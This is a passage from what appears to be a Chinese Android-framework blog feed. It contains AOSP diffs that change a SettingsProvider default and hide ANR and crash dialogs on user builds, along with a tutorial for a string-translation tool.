b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">@@ -<span class="number">2448</span>,<span class="number">8</span> +<span class="number">2448</span>,<span class="number">13</span> @@ <span class="keyword">class</span> <span class="title class_">DatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">              * IMPORTANT: Do not add any more upgrade steps here as the global,</span></span><br><span class="line"><span class="comment">              * secure, and system settings are no longer stored in a database</span></span><br><span class="line"><span class="comment">@@ -2457,6 +2462,9 @@ class DatabaseHelper extends SQLiteOpenHelper &#123;</span></span><br><span class="line"><span class="comment">              *</span></span><br><span class="line"><span class="comment">              * See: SettingsProvider.UpgradeController#onUpgradeLocked</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">+</span><br><span class="line">+            <span class="comment">// Create by yeruilai 2024-10-11 10:19:02 Double click the power button to start the camera</span></span><br><span class="line">+            loadIntegerSetting(stmt,Settings.Secure.CAMERA_DOUBLE_TAP_POWER_GESTURE_DISABLED, R.integer.def_camera_double_tap);</span><br><span class="line">         &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">             <span class="keyword">if</span> (stmt != <span class="literal">null</span>) stmt.close();</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p><strong>frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java</span><br><span class="line">index 4694f965905..b13e42287c8 <span class="number">100644</span></span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsProvider.java</span><br><span class="line">@@ -<span class="number">3653</span>,<span class="number">7</span> +<span class="number">3653</span>,<span class="number">9</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SettingsProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">UpgradeController</span> &#123;</span><br><span class="line">-            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SETTINGS_VERSION</span> <span class="operator">=</span> <span class="number">210</span>;</span><br><span class="line">+            <span class="comment">// Create by yeruilai 2024-10-14 11:47:55 Update default value</span></span><br><span class="line">+            <span class="comment">// private static final int SETTINGS_VERSION = 210;</span></span><br><span class="line">+            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SETTINGS_VERSION</span> <span class="operator">=</span> <span class="number">211</span>;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> mUserId;</span><br><span class="line"> </span><br><span class="line">@@ -<span class="number">5549</span>,<span class="number">6</span> +<span class="number">5551</span>,<span class="number">11</span> @@ <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SettingsProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">                     <span class="comment">// removed now that feature is enabled for everyone</span></span><br><span class="line">                     currentVersion = <span class="number">210</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">+                <span class="comment">// Create by yeruilai 2024-10-14 11:47:55 Update default value</span></span><br><span class="line">+                <span class="keyword">if</span> (currentVersion == <span class="number">210</span>) &#123;</span><br><span class="line">+                    <span class="comment">// removed now that feature is enabled for everyone</span></span><br><span class="line">+                    currentVersion = <span class="number">211</span>;</span><br><span class="line">+                &#125;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// v<span class="doctag">XXX:</span> Add new settings above this point. </span></span><br></pre></td></tr></table></figure><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><p>如果在OTA升级过程中忽略了更新SettingsProvider.java中的SETTINGS_VERSION，那么即使defaults.xml和设备Overlay资源已经被更新，升级后的系统也可能不会应用这些新的默认设置。<br>因此，为了确保升级后的系统能够正确应用新的默认配置，务必按照上述步骤操作，并特别注意SETTINGS_VERSION的更新</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android资源翻译工具教程</title>
      <link href="/2024/09/15/2024-09-15/"/>
      <url>/2024/09/15/2024-09-15/</url>
      
        <content type="html"><![CDATA[<h1 id="String-Translation-Tool-STT-使用指南"><a href="#String-Translation-Tool-STT-使用指南" class="headerlink" title="String Translation Tool (STT) 使用指南"></a>String Translation Tool (STT) 使用指南</h1><p>1.打开String Translation Tool (STT)，点击界面上的“Select Android Project”按钮</p><p><img src="/images/20240915/20240925165957.png"></p><p>2.在弹出的文件选择对话框中，浏览并选中您希望进行翻译的Android项目路径</p><p><img src="/images/20240915/20240925170045.png"></p><p>3.等待工具扫描项目资源文件，这可能需要一些时间，具体取决于文件大小。扫描完成后，选择您希望翻译的资源文件，并点击“Start Export”按钮。工具将在指定目录下生成一个名为“strings.xlsx”的Excel文件，该文件包含了所有待翻译的字符串</p><p><img src="/images/20240915/20240925170120.png"></p><h1 id="常见问题处理：调整表格格式"><a href="#常见问题处理：调整表格格式" class="headerlink" title="常见问题处理：调整表格格式"></a>常见问题处理：调整表格格式</h1><h3 id="情况描述：-客户提供的表格与STT生成的表格格式不匹配，需要手动调整"><a href="#情况描述：-客户提供的表格与STT生成的表格格式不匹配，需要手动调整" class="headerlink" title="情况描述： 客户提供的表格与STT生成的表格格式不匹配，需要手动调整"></a>情况描述： 客户提供的表格与STT生成的表格格式不匹配，需要手动调整</h3><p>1.打开生成的表格：首先，使用Excel打开STT生成的“strings.xlsx”文件，选择第2行</p><p><img src="/images/20240915/20240909143130.png"></p><p>2.进入排序设置：点击Excel菜单栏中的“数据”选项，然后选择“排序”下的“自定义排序”</p><p><img src="/images/20240915/20240909143155.png"></p><p>3.选择排序范围：在弹出的排序对话框中，确保“扩展选定区域”选项被选中，以确保整个表格按照您的设置进行排序</p><p><img src="/images/20240915/20240909143205.png"></p><p>4.设置排序选项：点击“选项”按钮，在弹出的对话框中选择“按行排序”，然后点击确定返回排序主对话框</p><p><img src="/images/20240915/20240909143230.png"></p><p>5.下拉选择”自定义排序”</p><p><img src="/images/20240915/20240909143247.png"></p><p>6.自定义排序序列：在排序对话框中，选择“自定义序列”选项，并输入或粘贴以下自定义的列名序列，以匹配客户表格的格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PATH</span><br><span class="line">NAME</span><br><span class="line">COMMENT</span><br><span class="line">ITEM COMMENT</span><br><span class="line">STRING CONTENT</span><br><span class="line">zh-rCN</span><br><span class="line">fr</span><br><span class="line">it</span><br><span class="line">sr</span><br><span class="line">es</span><br><span class="line">tr</span><br><span class="line">sk</span><br><span class="line">de</span><br><span class="line">fi</span><br><span class="line">cs</span><br><span class="line">nl</span><br><span class="line">fa</span><br><span class="line">hr</span><br><span class="line">lv</span><br><span class="line">lt</span><br><span class="line">ko</span><br><span class="line">ms</span><br><span class="line">pl</span><br><span class="line">ru</span><br><span class="line">ja</span><br><span class="line">pt</span><br><span class="line">ro</span><br><span class="line">uk</span><br><span class="line">hu</span><br><span class="line">ar</span><br><span class="line">bs</span><br><span class="line">az</span><br></pre></td></tr></table></figure><p><img src="/images/20240915/20240909143307.png"></p><p><img src="/images/20240915/20240909143300.png"></p><p>7.参考客户提供的表格与我们表格的差异</p><p><img src="/images/20240915/20240909143455.png"></p><p>8.将调整后的表格与客户提供的表格进行对比，确保所有必要的信息都已正确对齐和排序</p><h1 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h1><p>龙之叶博客：<br><a href="/images/20240915/TranslationTools-v3.1511.01.rar">TranslationTools-v3.1511.01.rar</a><br>CSDN：<br><a href="https://download.csdn.net/download/u010345983/89796784">TranslationTools-v3.1511.01.rar</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android14 屏蔽ANR和Crash弹窗</title>
      <link href="/2024/09/07/2024-09-07/"/>
      <url>/2024/09/07/2024-09-07/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Android系统在应用发生Crash/ANR的时候，总会弹出一个提示对话框，但是现在部分客户不想要这样的对话框，要求移除</p><h2 id="一、Application-Crash"><a href="#一、Application-Crash" class="headerlink" title="一、Application Crash"></a>一、Application Crash</h2><h4 id="表现：-程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。"><a href="#表现：-程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。" class="headerlink" title="表现： 程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。"></a>表现： 程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。</h4><h4 id="常见原因（Java异常）："><a href="#常见原因（Java异常）：" class="headerlink" title="常见原因（Java异常）："></a>常见原因（Java异常）：</h4><table><thead><tr><th>错误类型</th><th>详细描述</th></tr></thead><tbody><tr><td>NullPointerException</td><td>尝试在需要对象的地方使用了null。</td></tr><tr><td>SQLException</td><td>数据库操作错误，如SQL语句错误、数据库连接问题等。</td></tr><tr><td>ClassCastException</td><td>尝试将对象强制转换为不是其实例的子类。</td></tr><tr><td>NumberFormatException</td><td>将字符串转换为数字时格式不正确。</td></tr><tr><td>ClassNotFoundException</td><td>尝试加载的类在类路径中找不到。</td></tr><tr><td>ArithmeticException</td><td>数学运算错误，如除以零。</td></tr><tr><td>ArrayIndexOutOfBoundsException</td><td>数组索引越界。</td></tr><tr><td>IllegalArgumentException</td><td>向方法传递了非法或不适当的参数。</td></tr><tr><td>IllegalAccessException</td><td>尝试访问或修改类的字段，但当前方法没有足够的访问权限。</td></tr><tr><td>ArrayStoreException</td><td>试图将错误类型的对象存储到数组中。</td></tr></tbody></table><h4 id="Native-Crash（C-层）："><a href="#Native-Crash（C-层）：" class="headerlink" title="Native Crash（C++层）："></a>Native Crash（C++层）：</h4><p>Native Crash发生在C++代码层，Java层难以直接捕获错误信息，通常表现为应用闪退。可通过Monkey测试等自动化测试工具进行监控。</p><h4 id="具体原因："><a href="#具体原因：" class="headerlink" title="具体原因："></a>具体原因：</h4><ul><li>设备碎片化：不同设备间的兼容性问题。</li><li>网络问题：带宽不足、网络切换等。</li><li>内存管理：内存泄漏、非授权内存访问等。</li><li>用户负载：高并发用户导致的资源竞争。</li><li>代码错误：空指针访问、非法指令执行等。</li><li>第三方服务：如广告插件或第三方库的不稳定。</li></ul><h4 id="测试中如何关注："><a href="#测试中如何关注：" class="headerlink" title="测试中如何关注："></a>测试中如何关注：</h4><ul><li>界面操作验证：确保所有按钮、控件操作有效，响应正确。</li><li>负载测试：通过自动化工具进行长时间或高负载测试，暴露潜在问题。</li><li>重复操作测试：多次重复相同操作，检查是否出现崩溃。</li><li>异常输入测试：对输入框进行非标准输入，检查应用的容错能力。</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>查看日志文件中的am_crash相关条目，定位崩溃点。</li><li>根据日志中的堆栈跟踪，分析并修复代码问题。</li></ul><h1 id="二、ANR（Application-Not-Responding）"><a href="#二、ANR（Application-Not-Responding）" class="headerlink" title="二、ANR（Application Not Responding）"></a>二、ANR（Application Not Responding）</h1><p>表现： 应用无响应，用户界面卡住，系统弹出等待或强制关闭的对话框。</p><h4 id="对应用的影响："><a href="#对应用的影响：" class="headerlink" title="对应用的影响："></a>对应用的影响：</h4><ul><li>用户体验差，可能导致用户流失。</li><li>操作中断，可能造成数据丢失。</li></ul><h4 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h4><ul><li>主线程阻塞：UI线程在5秒内未响应输入事件。</li><li>BroadcastReceiver超时：未在10秒内完成处理并返回。</li></ul><h4 id="根本原因："><a href="#根本原因：" class="headerlink" title="根本原因："></a>根本原因：</h4><ul><li>主线程执行了耗时的IO操作（如数据库读写、网络请求）。</li><li>CPU资源被其他应用或线程占用，导致主线程得不到足够的时间片。</li></ul><h4 id="测试中如何关注：-1"><a href="#测试中如何关注：-1" class="headerlink" title="测试中如何关注："></a>测试中如何关注：</h4><ul><li>耗时操作监控：关注上传大文件、保存复杂数据等操作的响应时间。</li><li>网络压力测试：在网络状况不佳或变化时测试应用稳定性。</li><li>Monkey测试：通过随机事件生成器模拟用户操作，检测ANR问题。</li><li>内存和CPU监控：在多任务、多线程场景下监测资源使用情况。</li></ul><h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>在log文件夹中搜索am_anr或activitymanager: ANR，查找ANR日志。</li><li>分析<a href="mailto:&#x64;&#97;&#116;&#x61;&#x5f;&#97;&#x70;&#x70;&#95;&#97;&#110;&#114;&#x40;&#x78;&#x78;&#x78;&#x2e;&#116;&#120;&#x74;">&#x64;&#97;&#116;&#x61;&#x5f;&#97;&#x70;&#x70;&#95;&#97;&#110;&#114;&#x40;&#x78;&#x78;&#x78;&#x2e;&#116;&#120;&#x74;</a>文件中的异常堆栈，特别是主线程（main prio=5 tid=1）的阻塞情况。</li><li>根据日志信息，优化代码，避免在主线程中执行耗时操作，或使用异步编程模型处理耗时任务。</li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>在常规开发中，经常遇到手机性能较低，以上优化方法提升不大的情况下，建议直接屏蔽弹窗</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/services/core/java/com/android/server/am/ErrorDialogController.java b/frameworks/base/services/core/java/com/android/server/am/ErrorDialogController.java</span><br><span class="line">old mode <span class="number">100644</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">mode</span> <span class="number">100755</span></span><br><span class="line">index 82f35adbb13..a0942face68</span><br><span class="line">--- a/frameworks/base/services/core/java/com/android/server/am/ErrorDialogController.java</span><br><span class="line">+++ b/frameworks/base/services/core/java/com/android/server/am/ErrorDialogController.java</span><br><span class="line">@@ -<span class="number">35</span>,<span class="number">6</span> +<span class="number">35</span>,<span class="number">9</span> @@ <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ErrorDialogController</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> ActivityManagerService mService;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> ActivityManagerGlobalLock mProcLock;</span><br><span class="line"> </span><br><span class="line">+    <span class="comment">// Create by yeruilai 2024-8-29 15:57:56 Block ANR and Crash error dialogs</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">mShowDialog</span> <span class="operator">=</span> !Build.IS_USER;</span><br><span class="line">+</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * Dialogs being displayed due to crash.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">@@ -<span class="number">179</span>,<span class="number">7</span> +<span class="number">182</span>,<span class="number">13</span> @@ <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ErrorDialogController</span> &#123;</span><br><span class="line">                 dialogs = mCrashDialogs;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (dialogs != <span class="literal">null</span>) &#123;</span><br><span class="line">-                forAllDialogs(dialogs, Dialog::show);</span><br><span class="line">+                <span class="comment">// Create by yeruilai 2024-9-2 10:24:07 Block ANR and Crash error dialogs</span></span><br><span class="line">+                <span class="comment">// forAllDialogs(dialogs, Dialog::show);</span></span><br><span class="line">+                <span class="keyword">if</span>(mShowDialog) &#123;</span><br><span class="line">+                    forAllDialogs(dialogs, Dialog::show);</span><br><span class="line">+                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+                    forAllDialogs(dialogs, Dialog::dismiss);</span><br><span class="line">+                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">@@ -<span class="number">193</span>,<span class="number">7</span> +<span class="number">202</span>,<span class="number">13</span> @@ <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ErrorDialogController</span> &#123;</span><br><span class="line">             <span class="keyword">final</span> <span class="type">Context</span> <span class="variable">c</span> <span class="operator">=</span> contexts.get(i);</span><br><span class="line">             mAnrDialogs.add(<span class="keyword">new</span> <span class="title class_">AppNotRespondingDialog</span>(mService, c, data));</span><br><span class="line">         &#125;</span><br><span class="line">-        scheduleForAllDialogs(mAnrDialogs, Dialog::show);</span><br><span class="line">+        <span class="comment">// Create by yeruilai 2024-9-2 10:24:07 Block ANR and Crash error dialogs</span></span><br><span class="line">+        <span class="comment">// scheduleForAllDialogs(mAnrDialogs, Dialog::show);</span></span><br><span class="line">+        <span class="keyword">if</span>(mShowDialog) &#123;</span><br><span class="line">+            scheduleForAllDialogs(mAnrDialogs, Dialog::show);</span><br><span class="line">+        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+            scheduleForAllDialogs(mAnrDialogs, Dialog::dismiss);</span><br><span class="line">+        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="meta">@GuardedBy(&quot;mProcLock&quot;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> ANR </tag>
            
            <tag> Crash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 屏蔽ANR和Crash弹窗</title>
      <link href="/2024/09/01/2024-09-01/"/>
      <url>/2024/09/01/2024-09-01/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Android系统在应用发生Crash/ANR的时候，总会弹出一个提示对话框，但是现在部分客户不想要这样的对话框，要求移除</p><h2 id="一、Application-Crash"><a href="#一、Application-Crash" class="headerlink" title="一、Application Crash"></a>一、Application Crash</h2><h4 id="表现：-程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。"><a href="#表现：-程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。" class="headerlink" title="表现： 程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。"></a>表现： 程序崩溃或闪退，界面上通常会出现“应用已停止运行”的提示。</h4><h4 id="常见原因（Java异常）："><a href="#常见原因（Java异常）：" class="headerlink" title="常见原因（Java异常）："></a>常见原因（Java异常）：</h4><table><thead><tr><th>错误类型</th><th>详细描述</th></tr></thead><tbody><tr><td>NullPointerException</td><td>尝试在需要对象的地方使用了null。</td></tr><tr><td>SQLException</td><td>数据库操作错误，如SQL语句错误、数据库连接问题等。</td></tr><tr><td>ClassCastException</td><td>尝试将对象强制转换为不是其实例的子类。</td></tr><tr><td>NumberFormatException</td><td>将字符串转换为数字时格式不正确。</td></tr><tr><td>ClassNotFoundException</td><td>尝试加载的类在类路径中找不到。</td></tr><tr><td>ArithmeticException</td><td>数学运算错误，如除以零。</td></tr><tr><td>ArrayIndexOutOfBoundsException</td><td>数组索引越界。</td></tr><tr><td>IllegalArgumentException</td><td>向方法传递了非法或不适当的参数。</td></tr><tr><td>IllegalAccessException</td><td>尝试访问或修改类的字段，但当前方法没有足够的访问权限。</td></tr><tr><td>ArrayStoreException</td><td>试图将错误类型的对象存储到数组中。</td></tr></tbody></table><h4 id="Native-Crash（C-层）："><a href="#Native-Crash（C-层）：" class="headerlink" title="Native Crash（C++层）："></a>Native Crash（C++层）：</h4><p>Native Crash发生在C++代码层，Java层难以直接捕获错误信息，通常表现为应用闪退。可通过Monkey测试等自动化测试工具进行监控。</p><h4 id="具体原因："><a href="#具体原因：" class="headerlink" title="具体原因："></a>具体原因：</h4><ul><li>设备碎片化：不同设备间的兼容性问题。</li><li>网络问题：带宽不足、网络切换等。</li><li>内存管理：内存泄漏、非授权内存访问等。</li><li>用户负载：高并发用户导致的资源竞争。</li><li>代码错误：空指针访问、非法指令执行等。</li><li>第三方服务：如广告插件或第三方库的不稳定。</li></ul><h4 id="测试中如何关注："><a href="#测试中如何关注：" class="headerlink" title="测试中如何关注："></a>测试中如何关注：</h4><ul><li>界面操作验证：确保所有按钮、控件操作有效，响应正确。</li><li>负载测试：通过自动化工具进行长时间或高负载测试，暴露潜在问题。</li><li>重复操作测试：多次重复相同操作，检查是否出现崩溃。</li><li>异常输入测试：对输入框进行非标准输入，检查应用的容错能力。</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>查看日志文件中的am_crash相关条目，定位崩溃点。</li><li>根据日志中的堆栈跟踪，分析并修复代码问题。</li></ul><h1 id="二、ANR（Application-Not-Responding）"><a href="#二、ANR（Application-Not-Responding）" class="headerlink" title="二、ANR（Application Not Responding）"></a>二、ANR（Application Not Responding）</h1><p>表现： 应用无响应，用户界面卡住，系统弹出等待或强制关闭的对话框。</p><h4 id="对应用的影响："><a href="#对应用的影响：" class="headerlink" title="对应用的影响："></a>对应用的影响：</h4><ul><li>用户体验差，可能导致用户流失。</li><li>操作中断，可能造成数据丢失。</li></ul><h4 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h4><ul><li>主线程阻塞：UI线程在5秒内未响应输入事件。</li><li>BroadcastReceiver超时：未在10秒内完成处理并返回。</li></ul><h4 id="根本原因："><a href="#根本原因：" class="headerlink" title="根本原因："></a>根本原因：</h4><ul><li>主线程执行了耗时的IO操作（如数据库读写、网络请求）。</li><li>CPU资源被其他应用或线程占用，导致主线程得不到足够的时间片。</li></ul><h4 id="测试中如何关注：-1"><a href="#测试中如何关注：-1" class="headerlink" title="测试中如何关注："></a>测试中如何关注：</h4><ul><li>耗时操作监控：关注上传大文件、保存复杂数据等操作的响应时间。</li><li>网络压力测试：在网络状况不佳或变化时测试应用稳定性。</li><li>Monkey测试：通过随机事件生成器模拟用户操作，检测ANR问题。</li><li>内存和CPU监控：在多任务、多线程场景下监测资源使用情况。</li></ul><h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>在log文件夹中搜索am_anr或activitymanager: ANR，查找ANR日志。</li><li>分析<a href="mailto:&#x64;&#97;&#x74;&#97;&#x5f;&#97;&#112;&#112;&#x5f;&#97;&#110;&#x72;&#x40;&#120;&#x78;&#120;&#x2e;&#116;&#120;&#116;">&#x64;&#97;&#x74;&#97;&#x5f;&#97;&#112;&#112;&#x5f;&#97;&#110;&#x72;&#x40;&#120;&#x78;&#120;&#x2e;&#116;&#120;&#116;</a>文件中的异常堆栈，特别是主线程（main prio=5 tid=1）的阻塞情况。</li><li>根据日志信息，优化代码，避免在主线程中执行耗时操作，或使用异步编程模型处理耗时任务。</li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>在常规开发中，经常遇到手机性能较低，以上优化方法提升不大的情况下，建议直接屏蔽弹窗</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/services/core/java/com/android/server/am/AppErrors.java b/frameworks/base/services/core/java/com/android/server/am/AppErrors.java</span><br><span class="line">index 6d56454ede0..dedf694d9aa <span class="number">100644</span></span><br><span class="line">--- a/frameworks/base/services/core/java/com/android/server/am/AppErrors.java</span><br><span class="line">+++ b/frameworks/base/services/core/java/com/android/server/am/AppErrors.java</span><br><span class="line">@@ -<span class="number">142</span>,<span class="number">6</span> +<span class="number">142</span>,<span class="number">9</span> @@ <span class="keyword">class</span> <span class="title class_">AppErrors</span> &#123;</span><br><span class="line">      */</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">mBadProcessLock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"> </span><br><span class="line">+    <span class="comment">// Create by yeruilai 2024-8-29 15:57:56 Block ANR and Crash error dialogs</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">mShowDialog</span> <span class="operator">=</span> !Build.IS_USER;</span><br><span class="line">+</span><br><span class="line">     AppErrors(Context context, ActivityManagerService service, PackageWatchdog watchdog) &#123;</span><br><span class="line">         context.assertRuntimeOverlayThemable();</span><br><span class="line">         mService = service;</span><br><span class="line">@@ -<span class="number">1048</span>,<span class="number">7</span> +<span class="number">1051</span>,<span class="number">11</span> @@ <span class="keyword">class</span> <span class="title class_">AppErrors</span> &#123;</span><br><span class="line">                         &amp;&amp; !crashSilenced &amp;&amp; !shouldThottle</span><br><span class="line">                         &amp;&amp; (showFirstCrash || showFirstCrashDevOption || data.repeating)) &#123;</span><br><span class="line">                     Slog.i(TAG, <span class="string">&quot;Showing crash dialog for package &quot;</span> + packageName + <span class="string">&quot; u&quot;</span> + userId);</span><br><span class="line">-                    errState.getDialogController().showCrashDialogs(data);</span><br><span class="line">+                    <span class="comment">// Create by yeruilai 2024-8-29 15:57:56 Block ANR and Crash error dialogs</span></span><br><span class="line">+                    android.util.Log.d(TAG,<span class="string">&quot;yeruilai:AppErrors:showCrashDialogs:mShowDialog=&quot;</span> + mShowDialog);</span><br><span class="line">+                    <span class="keyword">if</span>(mShowDialog) &#123;</span><br><span class="line">+                        errState.getDialogController().showCrashDialogs(data);</span><br><span class="line">+                    &#125;</span><br><span class="line">                     <span class="keyword">if</span> (!proc.isolated) &#123;</span><br><span class="line">                         